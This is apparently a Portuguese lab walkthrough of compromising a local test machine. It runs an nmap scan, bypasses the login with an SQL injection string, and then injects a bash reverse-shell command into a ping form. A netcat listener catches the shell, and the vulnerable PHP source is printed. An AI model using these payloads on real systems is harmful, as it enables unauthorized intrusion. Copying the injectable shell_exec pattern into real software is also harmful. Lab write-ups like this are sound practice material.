Executar um nmap para verificar em qual ip a nova maquina de testes está rodando

$nmap -n -p 80 --open 192.168.0.189/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-26 20:54 -03

Nmap scan report for 192.168.0.48
Host is up (0.00042s latency).

Acessar o browser pelo burp suite:
e inserir no campo usuario o seguinte trecho de SQLi:
' or 1=1 #
isso vai anular a necessidade de inserir um usuario


após entrar, verificamos que o sistema tem um problema de sintaxe no html
podemos corrigir isso interceptando as responses no burp suite
<html><head></head><body>

<!-- Start of HTML when logged in as Administator -->
	<form name="ping" action="pingit.php" method="post" target="_blank">
		<table width="600" border="1">
		<tbody><tr valign="middle">
			<td colspan="2" align="center">
			<b>Welcome to the Basic Administrative Web Console<br></b>
			</td>
		</tr>
		<tr valign="middle">
			<td align="center">
				Ping a Machine on the Network:
			</td>
				<td align="center">
				<input type="text" name="ip" size="30">
				<input type="submit" value="submit" name="submit">
			</td>
			
		</tr>
	</tbody></table>
	</form>





</body></html>

----------------------------------------------------------------------------------
Essa aplicação faz um ping em um determinado ip

Vamos executar a vulerabilidade de command injection
Como o campo de texto aceita um ip, podemos colocar o ip e mais alguns comandos:
192.168.0.189;bash -i >& /dev/tcp/192.168.0.189/80 0>&1

o ; encerra o primeiro comando e podemos adicionar bash -i mais o ip da minha maquina

depois na minha maquina posso adicionar um 
nc -nlvp 80

e executar o submit na aplicação web e pronto:

listening on [any] 80 ...
connect to [192.168.0.189] from (UNKNOWN) [192.168.0.48] 32769
bash: no job control in this shell
bash-3.00$ ls
index.php
pingit.php
bash-3.00$ cat pingit.php
<?php

print $_POST['ip'];
if (isset($_POST['submit'])){
        $target = $_REQUEST[ 'ip' ];
        echo '<pre>';
        echo shell_exec( 'ping -c 3 ' . $target );
        echo '</pre>';
    }
?>
bash-3.00$

Teremos acesso a maquina apache.

